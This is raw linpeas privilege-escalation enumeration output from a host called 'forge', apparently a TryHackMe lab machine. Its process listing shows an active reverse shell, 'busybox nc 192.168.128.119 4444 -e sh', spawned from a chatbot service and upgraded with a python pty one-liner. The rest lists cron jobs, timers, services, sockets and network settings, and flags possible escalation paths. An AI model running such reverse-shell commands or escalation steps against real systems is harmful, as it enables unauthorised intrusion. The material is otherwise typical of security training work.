azrael       827  0.5  0.7 185824 29628 ?        Sl   03:10   0:20  _ /usr/bin/python3 /home/azrael/chatbotServer/chatbot.py
azrael      3563  0.0  0.0   2892   964 ?        S    04:00   0:00      _ /bin/sh -c busybox nc 192.168.128.119 4444 -e sh
azrael      3564  0.0  0.0   2456     4 ?        S    04:00   0:00          _ sh
azrael      3569  0.0  0.2  17476  9272 ?        S    04:01   0:00              _ python3 -c import pty; pty.spawn("/bin/bash")
azrael      3570  0.0  0.1   8700  5204 pts/0    Ss   04:01   0:00                  _ /bin/bash
azrael      4366  0.2  0.0   4120  2964 pts/0    S+   04:16   0:00                      _ /bin/sh ./linpeas.sh
azrael      7826  0.0  0.0   4120  1316 pts/0    S+   04:17   0:00                          _ /bin/sh ./linpeas.sh
azrael      7828  0.0  0.0  10228  3440 pts/0    R+   04:17   0:00                          |   _ ps fauxwww
azrael      7830  0.0  0.0   4120  1316 pts/0    S+   04:17   0:00                          _ /bin/sh ./linpeas.sh
root         605  0.0  0.0   6896  2912 ?        Ss   03:10   0:00 /usr/sbin/cron -f -P
message+     606  0.0  0.1   8752  4712 ?        Ss   03:10   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
epmd         609  0.0  0.0   7140  1876 ?        Ss   03:10   0:00 /usr/bin/epmd -systemd
root         610  0.0  1.5 711076 59388 ?        Ssl  03:10   0:01 /usr/bin/node /root/forge_web_service/app.js
root         614  0.0  0.0  82700  1964 ?        Ssl  03:10   0:00 /usr/sbin/irqbalance --foreground
root         615  0.0  0.4  32744 19116 ?        Ss   03:10   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         616  0.0  0.2 236036  8884 ?        Ssl  03:10   0:00 /usr/libexec/polkitd --no-debug
syslog       619  0.0  0.1 222404  5504 ?        Ssl  03:10   0:00 /usr/sbin/rsyslogd -n -iNONE
root         624  0.0  0.7 1319964 28532 ?       Ssl  03:10   0:00 /usr/lib/snapd/snapd
root         636  0.0  0.1  14912  6484 ?        Ss   03:10   0:00 /lib/systemd/systemd-logind
root         638  0.0  0.3 392600 12668 ?        Ssl  03:10   0:00 /usr/libexec/udisks2/udisksd
daemon[0m       640  0.0  0.0   3864  1336 ?        Ss   03:10   0:00 /usr/sbin/atd -f
root         650  0.0  0.0   5800  1088 ttyS0    Ss+  03:10   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,57600,38400,9600 ttyS0 vt220
root         663  0.0  0.0   6176  1076 tty1     Ss+  03:10   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         687  0.0  0.3 317968 12336 ?        Ssl  03:10   0:00 /usr/sbin/ModemManager
root         749  0.0  0.1   7512  5372 ?        Ss   03:10   0:00 /usr/sbin/apache2 -k start
www-data     750  0.0  0.1 1212736 5568 ?        Sl   03:10   0:00  _ /usr/sbin/apache2 -k start
www-data     751  0.0  0.1 1212924 5820 ?        Sl   03:10   0:00  _ /usr/sbin/apache2 -k start
uuidd        829  0.0  0.0   9200  1544 ?        Ss   03:10   0:00 /usr/sbin/uuidd --socket-activation
rabbitmq    1217  0.0  0.0   2780  1612 ?        Ss   03:10   0:00  _ erl_child_setup 65536
rabbitmq    1269  0.0  0.0   3740  1312 ?        Ss   03:10   0:00      _ inet_gethost 4
rabbitmq    1270  0.0  0.0   3740   112 ?        S    03:10   0:00          _ inet_gethost 4
root        1300  0.0  1.0 690308 42184 ?        Ssl  03:11   0:00 /usr/bin/node /root/forge_web_service/rabbitmq/worker.js

╔══════════╣ Processes with unusual configurations
                                                                                                                                                                                        
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                       
gdm-password Not Found                                                                                                                                                                  
gnome-keyring-daemon Not Found                                                                                                                                                          
lightdm Not Found                                                                                                                                                                       
vsftpd Not Found                                                                                                                                                                        
apache2 process found (dump creds from memory as root)                                                                                                                                  
sshd: process found (dump creds from memory as root)
mysql Not Found
postgres Not Found                                                                                                                                                                      
redis-server Not Found                                                                                                                                                                  
mongod Not Found                                                                                                                                                                        
memcached Not Found                                                                                                                                                                     
elasticsearch Not Found                                                                                                                                                                 
jenkins Not Found                                                                                                                                                                       
tomcat Not Found                                                                                                                                                                        
nginx Not Found                                                                                                                                                                         
php-fpm Not Found                                                                                                                                                                       
supervisord Not Found                                                                                                                                                                   
vncserver Not Found                                                                                                                                                                     
xrdp Not Found                                                                                                                                                                          
teamviewer Not Found                                                                                                                                                                    
                                                                                                                                                                                        
╔══════════╣ Opened Files by processes
Process 827 (azrael) - /usr/bin/python3 /home/azrael/chatbotServer/chatbot.py                                                                                                           
  └─ Has open files:
    └─ pipe:[27198]
Process 3563 (azrael) - /bin/sh -c busybox nc 192.168.128.119 4444 -e sh 
  └─ Has open files:
    └─ pipe:[27198]
Process 3569 (azrael) - python3 -c import pty; pty.spawn("/bin/bash") 
  └─ Has open files:
    └─ /dev/ptmx
Process 3570 (azrael) - /bin/bash 
  └─ Has open files:
    └─ /dev/pts/0

╔══════════╣ Processes with memory-mapped credential files
                                                                                                                                                                                        
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                               
                                                                                                                                                                                        
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                      
                                                                                                                                                                                        
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                    
══╣ Cron jobs list                                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                        
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab                                                                                                                                

/etc/cron.d:
total 24
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rwxr-xr-x   1 root root   539 Dec  4  2023 apache2
-rwxr-xr-x   1 root root   376 Sep 16  2021 apport
-rwxr-xr-x   1 root root  1478 Feb 13  2024 apt-compat
-rwxr-xr-x   1 root root   355 Dec 29  2017 bsdmainutils.dpkg-remove
-rwxr-xr-x   1 root root   384 Nov 19  2019 cracklib-runtime
-rwxr-xr-x   1 root root   123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root   377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root  1330 Mar 17  2022 man-db
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 20
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rwxr-xr-x   1 root root  1020 Mar 17  2022 man-db
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder

SHELL=/bin/sh

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...                                                                                                                                                            

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                
══╣ Active timers:                                                                                                                                                                      
NEXT                        LEFT           LAST                        PASSED               UNIT                           ACTIVATES                                                    
Fri 2026-10-02 04:19:39 UTC 2min 8s left   Mon 2024-09-09 12:50:08 UTC 2 years 0 months ago fstrim.timer                   fstrim.service
Fri 2026-10-02 04:20:04 UTC 2min 33s left  Fri 2026-10-02 04:17:04 UTC 26s ago              cleanup.timer                  cleanup.service
Fri 2026-10-02 04:51:27 UTC 33min left     Fri 2024-08-16 12:10:44 UTC 2 years 1 month ago  fwupd-refresh.timer            fwupd-refresh.service
Fri 2026-10-02 05:05:28 UTC 47min left     Fri 2024-08-16 10:21:11 UTC 2 years 1 month ago  motd-news.timer                motd-news.service
Fri 2026-10-02 06:08:23 UTC 1h 50min left  Fri 2026-10-02 03:59:25 UTC 18min ago            apt-daily-upgrade.timer        apt-daily-upgrade.service
Fri 2026-10-02 07:16:10 UTC 2h 58min left  Mon 2024-09-09 12:48:19 UTC 2 years 0 months ago man-db.timer                   man-db.service
Fri 2026-10-02 14:52:54 UTC 10h left       Fri 2026-10-02 04:12:00 UTC 5min ago             apt-daily.timer                apt-daily.service
Sat 2026-10-03 00:00:00 UTC 19h left       n/a                         n/a                  dpkg-db-backup.timer           dpkg-db-backup.service
Sat 2026-10-03 00:00:00 UTC 19h left       Fri 2026-10-02 03:10:25 UTC 1h 7min ago          logrotate.timer                logrotate.service
Sat 2026-10-03 03:15:00 UTC 22h left       Fri 2026-10-02 03:15:00 UTC 1h 2min ago          update-notifier-download.timer update-notifier-download.service
Sat 2026-10-03 03:25:10 UTC 23h left       Fri 2026-10-02 03:25:10 UTC 52min ago            systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sun 2026-10-04 03:10:38 UTC 1 day 22h left Fri 2026-10-02 03:10:26 UTC 1h 7min ago          e2scrub_all.timer              e2scrub_all.service
Thu 2026-10-08 20:43:37 UTC 6 days left    Thu 2024-08-15 09:14:28 UTC 2 years 1 month ago  update-notifier-motd.timer     update-notifier-motd.service
n/a                         n/a            n/a                         n/a                  apport-autoreport.timer        apport-autoreport.service
n/a                         n/a            Fri 2026-10-02 03:11:57 UTC 1h 5min ago          forge_worker.timer             forge_worker.service
n/a                         n/a            n/a                         n/a                  snapd.snap-repair.timer        snapd.snap-repair.service
n/a                         n/a            n/a                         n/a                  ua-timer.timer                 ua-timer.service
══╣ Disabled timers:
══╣ Additional timer files:                                                                                                                                                             
Potential privilege escalation in timer file: /etc/systemd/system/cleanup.timer                                                                                                         
  └─ RELATIVE_PATH: Uses relative path in Unit directive
Potential privilege escalation in timer file: /etc/systemd/system/forge_worker.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/cleanup.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive
Potential privilege escalation in timer file: /etc/systemd/system/timers.target.wants/forge_worker.timer
  └─ RELATIVE_PATH: Uses relative path in Unit directive

╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                              
                                                                                                                                                                                        
══╣ Active services:
amazon-ssm-agent.service                                                                  loaded active running amazon-ssm-agent                                                        
apache2.service                                                                           loaded active running The Apache HTTP Server
apparmor.service                                                                          loaded active exited  Load AppArmor profiles
apport.service                                                                            loaded active exited  LSB: automatic crash report generation
atd.service                                                                               loaded active running Deferred execution scheduler
  Potential issue in service file: /lib/systemd/system/atd.service
  └─ RELATIVE_PATH: Could be executing some relative path
blk-availability.service                                                                  loaded active exited  Availability of block devices
chatbot.service                                                                           loaded active running Chatbot Service
cloud-config.service                                                                      loaded active exited  Apply the settings specified in cloud-config
cloud-final.service                                                                       loaded active exited  Execute cloud user/final scripts
cloud-init-local.service                                                                  loaded active exited  Initial cloud-init job (pre-networking)
cloud-init.service                                                                        loaded active exited  Initial cloud-init job (metadata service crawler)
console-setup.service                                                                     loaded active exited  Set console font and keymap
cron.service                                                                              loaded active running Regular background program processing daemon
dbus.service                                                                              loaded active running D-Bus System Message Bus
  Potential issue in service file: /lib/systemd/system/dbus.service
  └─ RELATIVE_PATH: Could be executing some relative path
epmd.service                                                                              loaded active running Erlang Port Mapper Daemon
finalrd.service                                                                           loaded active exited  Create final runtime dir for shutdown pivot root
forge.service                                                                             loaded active running My Forge Web App
  Potential issue in service: forge.service
  └─ RUNS_AS_ROOT: Service runs as root
forge_worker.service                                                                      loaded active running My Forge Web App Worker
  Potential issue in service: forge_worker.service
  └─ RUNS_AS_ROOT: Service runs as root
getty@tty1.service                                                                        loaded active running Getty on tty1
irqbalance.service                                                                        loaded active running irqbalance daemon
keyboard-setup.service                                                                    loaded active exited  Set the console keyboard layout
kmod-static-nodes.service                                                                 loaded active exited  Create List of Static Device Nodes
lvm2-monitor.service                                                                      loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
lvm2-pvscan@259:4.service                                                                 loaded active exited  LVM event activation on device 259:4
ModemManager.service                                                                      loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root
multipathd.service                                                                        loaded active running Device-Mapper Multipath Device Controller
networkd-dispatcher.service                                                               loaded active running Dispatcher daemon for systemd-networkd
plymouth-quit-wait.service                                                                loaded active exited  Hold until boot process finishes up
plymouth-quit.service                                                                     loaded active exited  Terminate Plymouth Boot Screen
plymouth-read-write.service                                                               loaded active exited  Tell Plymouth To Write Out Runtime Data
polkit.service                                                                            loaded active running Authorization Manager
rabbitmq-server.service                                                                   loaded active running RabbitMQ Messaging Server
rc-local.service                                                                          loaded active exited  /etc/rc.local Compatibility
rsyslog.service                                                                           loaded active running System Logging Service
saned.service                                                                             loaded active exited  LSB: SANE network scanner server
serial-getty@ttyS0.service                                                                loaded active running Serial Getty on ttyS0
setvtrgb.service                                                                          loaded active exited  Set console scheme
snapd.apparmor.service                                                                    loaded active exited  Load AppArmor profiles managed internally by snapd
snapd.seeded.service                                                                      loaded active exited  Wait until snapd is fully seeded
snapd.service                                                                             loaded active running Snap Daemon
ssh.service                                                                               loaded active running OpenBSD Secure Shell server
systemd-binfmt.service                                                                    loaded active exited  Set Up Additional Binary Formats
systemd-fsck@dev-disk-by\x2duuid-363644ae\x2df249\x2d4fde\x2d9994\x2d38dc08419512.service loaded active exited  File System Check on /dev/disk/by-uuid/363644ae-f249-4fde-9994-38dc08419512
systemd-journal-flush.service                                                             loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-journald.service                                                                  loaded active running Journal Service
systemd-logind.service                                                                    loaded active running User Login Management
systemd-modules-load.service                                                              loaded active exited  Load Kernel Modules
systemd-networkd-wait-online.service                                                      loaded active exited  Wait for Network to be Configured
systemd-networkd.service                                                                  loaded active running Network Configuration
  Potential issue in service file: /lib/systemd/system/systemd-networkd.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-random-seed.service                                                               loaded active exited  Load/Save Random Seed
systemd-remount-fs.service                                                                loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-resolved.service                                                                  loaded active running Network Name Resolution
systemd-sysctl.service                                                                    loaded active exited  Apply Kernel Variables
systemd-sysusers.service                                                                  loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-timesyncd.service                                                                 loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service                                                        loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service                                                            loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service                                                              loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-udevd.service                                                                     loaded active running Rule-based Manager for Device Events and Files
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-update-utmp.service                                                               loaded active exited  Record System Boot/Shutdown in UTMP
systemd-user-sessions.service                                                             loaded active exited  Permit User Sessions
udisks2.service                                                                           loaded active running Disk Manager
ufw.service                                                                               loaded active exited  Uncomplicated firewall
uuidd.service                                                                             loaded active running Daemon for generating UUIDs
LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
64 loaded units listed.

══╣ Disabled services:
apache-htcacheclean.service            disabled enabled                                                                                                                                 
apache-htcacheclean@.service           disabled enabled
apache2@.service                       disabled enabled
console-getty.service                  disabled disabled
debug-shell.service                    disabled disabled
iscsid.service                         disabled enabled
nftables.service                       disabled enabled
systemd-boot-check-no-failures.service disabled disabled
systemd-network-generator.service      disabled enabled
systemd-sysext.service                 disabled enabled
  Potential issue in service file: /lib/systemd/system/systemd-sysext.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-time-wait-sync.service         disabled disabled
upower.service                         disabled enabled
12 unit files listed.

══╣ Additional service files:
  Potential issue in service file: /etc/systemd/system/cleanup.service                                                                                                                  
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/atd.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/grub-common.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/systemd-networkd.service
  └─ RELATIVE_PATH: Could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                         
═╣ Systemd version and vulnerabilities? .............. 249.11                                                                                                                           
3.12
═╣ Services running as root? ..... 
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)
chatbot.service: /home/azrael/chatbotServer/chatbot.py (from ExecStart=/usr/bin/python3 /home/azrael/chatbotServer/chatbot.py)
dbus.service: Uses relative path '@dbus-daemon' (from ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only)
networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                             

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                               
                                                                                                                                                                                        
╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                               
/run/dbus/system_bus_socket                                                                                                                                                             
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/irqbalance/irqbalance614.sock
  └─(Read Execute )
  └─(Owned by root)
/run/snapd-snap.socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/snapd.socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/dev-log
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/stdout
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/syslog
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/notify
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/systemd/private
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/systemd/resolve/io.systemd.Resolve
  └─(Read Write (Weak Permissions: 666) )
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/udev/control
/run/uuidd/request
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                 
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                                                      
:1.0                            578 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -
:1.1                            586 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
:1.10                           687 ModemManager    root             :1.10         ModemManager.service        -       -
:1.11                           624 snapd           root             :1.11         snapd.service               -       -
:1.2                            588 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
:1.3                              1 systemd         root             :1.3          init.scope                  -       -
:1.4                            636 systemd-logind  root             :1.4          systemd-logind.service      -       -
:1.5                            616 polkitd         root             :1.5          polkit.service              -       -
:1.576                        22934 busctl          azrael           :1.576        chatbot.service             -       -
:1.7                            615 networkd-dispat root             :1.7          networkd-dispatcher.service -       -
:1.8                            638 udisksd         root             :1.8          udisks2.service             -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.ModemManager1   687 ModemManager    root             :1.10         ModemManager.service        -       -
org.freedesktop.PolicyKit1      616 polkitd         root             :1.5          polkit.service              -       -
org.freedesktop.UDisks2         638 udisksd         root             :1.8          udisks2.service             -       -
org.freedesktop.UPower            - -               -                (activatable) -                           -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          636 systemd-logind  root             :1.4          systemd-logind.service      -       -
org.freedesktop.network1        586 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
org.freedesktop.resolve1        588 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.3          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       578 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service   -       -

╔══════════╣ D-Bus Configuration Files
Analyzing /etc/dbus-1/system.d/avahi-dbus.conf:                                                                                                                                         
  └─(Weak user policy found)
     └─   <policy user="avahi">
  └─(Weak group policy found)
     └─   <policy group="netdev">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.Avahi"/>
            <allow receive_sender="org.freedesktop.Avahi"/>
Analyzing /etc/dbus-1/system.d/bluetooth.conf:
  └─(Weak group policy found)
     └─   <policy group="bluetooth">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.bluez"/>
Analyzing /etc/dbus-1/system.d/com.ubuntu.WhoopsiePreferences.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="com.ubuntu.WhoopsiePreferences" 
            <allow send_destination="com.ubuntu.WhoopsiePreferences" 
            <allow send_destination="com.ubuntu.WhoopsiePreferences" 
Analyzing /etc/dbus-1/system.d/net.hadess.SensorProxy.conf:
  └─(Weak user policy found)
     └─   <policy user="geoclue">
  └─(Allow rules in default context)
             └─     <allow send_destination="net.hadess.SensorProxy" send_interface="net.hadess.SensorProxy"/>
            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Introspectable"/>
            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Properties"/>
            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Peer"/>
Analyzing /etc/dbus-1/system.d/net.hadess.SwitcherooControl.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="net.hadess.SwitcherooControl"
            <allow send_destination="net.hadess.SwitcherooControl"
Analyzing /etc/dbus-1/system.d/org.debian.apt.conf:
  └─(Allow rules in default context)
             └─     <allow send_interface="org.debian.apt"/>
            <allow send_interface="org.debian.apt.transaction"/>
            <allow send_destination="org.debian.apt"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf:
  └─(Allow rules in default context)
             └─     <!-- Methods listed here are explicitly allowed or PolicyKit protected.
Analyzing /etc/dbus-1/system.d/org.freedesktop.thermald.conf:
  └─(Weak group policy found)
     └─         <policy group="power">
  └─(Allow rules in default context)
             └─                 <allow receive_sender="org.freedesktop.thermald"/>
                        <allow send_destination="org.freedesktop.thermald"/>
Analyzing /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf:
  └─(Weak user policy found)
     └─   <policy user="cups-pk-helper">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.opensuse.CupsPkHelper.Mechanism"/>

══╣ D-Bus Session Bus Analysis
(Access to session bus available)                                                                                                                                                       


╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust
                                                                                                                                                                                        
══╣ Listening r-services (TCP 512-514)
                                                                                                                                                                                        
══╣ systemd units exposing r-services
rlogin|rsh|rexec units Not Found                                                                                                                                                        
                                                                                                                                                                                        
══╣ inetd/xinetd configuration for r-services
/etc/inetd.conf Not Found                                                                                                                                                               
/etc/xinetd.d Not Found                                                                                                                                                                 
                                                                                                                                                                                        
══╣ Installed r-service server packages
  No related packages found via dpkg                                                                                                                                                    

══╣ /etc/hosts.equiv and /etc/shosts.equiv
                                                                                                                                                                                        
══╣ Per-user .rhosts files
.rhosts Not Found                                                                                                                                                                       
                                                                                                                                                                                        
══╣ PAM rhosts authentication
/etc/pam.d/rlogin|rsh Not Found                                                                                                                                                         
                                                                                                                                                                                        
══╣ SSH HostbasedAuthentication
  HostbasedAuthentication no or not set                                                                                                                                                 

══╣ Potential DNS control indicators (local)
  Not detected                                                                                                                                                                          

╔══════════╣ Crontab UI (root) misconfiguration checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                    
crontab-ui Not Found                                                                                                                                                                    
                                                                                                                                                                                        

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                     
                              ╚═════════════════════╝                                                                                                                                   
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                     
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.113.174.149  netmask 255.255.192.0  broadcast 10.113.191.255
        inet6 fe80::4ff:f6ff:fe90:621f  prefixlen 64  scopeid 0x20<link>
        ether 06:ff:f6:90:62:1f  txqueuelen 1000  (Ethernet)
        RX packets 4147  bytes 1492398 (1.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4339  bytes 846801 (846.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1638  bytes 146278 (146.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1638  bytes 146278 (146.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information                                                                                                                                                                
System hostname: forge                                                                                                                                                                  
FQDN: forge

══╣ Hosts File Information
Contents of /etc/hosts:                                                                                                                                                                 
  127.0.0.1 localhost
  127.0.1.1 forge
  127.0.0.1 cloudsite.thm
  127.0.0.1 storage.cloudsite.thm
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):                                                                                                                                                              
  127.0.0.53
  search eu-central-1.compute.internal
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
DNS Domain Information:
(none)

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                            
══╣ Active Ports (netstat)                                                                                                                                                              
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25672           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:15672         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5672          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      604/python3         
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::4369                 :::*                    LISTEN      -                   

╔══════════╣ Network Traffic Analysis Capabilities
                                                                                                                                                                                        
